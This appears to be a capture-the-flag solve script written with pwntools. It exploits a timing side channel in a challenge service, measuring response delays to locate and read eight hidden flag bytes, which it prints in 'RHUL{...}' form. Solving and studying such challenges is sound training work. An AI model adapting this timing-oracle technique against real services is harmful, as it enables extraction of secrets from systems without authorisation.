from pwn import *
import time

HOST = "localhost" # change to the actual host
PORT = 1363 # change to the actual port

TIME_DELAY = 0.2
def main():
    conn = remote(HOST, PORT)

    recovered_bytes = []
    not_recovered_bytes = [i for i in range(8)]
    while len(recovered_bytes) != 8:
        flag_bytes_inserted = min(len(not_recovered_bytes), 4)
        for i in not_recovered_bytes[:flag_bytes_inserted]:
            conn.sendline(b"0")
            conn.sendline(f"{i}".encode())

            start = time.perf_counter()
            conn.recvuntil(b"read!\n")
            end = time.perf_counter()
            delay = round(end - start, 1)

        i = 0
        hit = 0
        while i < 8 - flag_bytes_inserted + hit:
            conn.sendline(b"1")
            conn.sendline(f"{i}".encode())

            start = time.perf_counter()
            conn.recvuntil(b"read!\n")
            end = time.perf_counter()
            delay = round(end - start, 1)

            expected_delay = round(float(flag_bytes_inserted * TIME_DELAY + i * TIME_DELAY - hit * TIME_DELAY), 1)
            
            if delay != expected_delay:
                hit += 1
                idx = not_recovered_bytes[round(delay / TIME_DELAY)]
                conn.recvuntil(b"data: ")
                fb = int(conn.recvline().strip().decode())

                if (idx, fb) not in recovered_bytes:
                    recovered_bytes.append((idx, fb))
                    not_recovered_bytes.remove(idx)
            
            i += 1

    recovered_bytes.sort(key=lambda tup: tup[0])
    flag_bytes = bytes([b for _, b in recovered_bytes])
    print(f"RHUL{flag_bytes.hex()}")

    conn.close()

if __name__ == "__main__":
    main()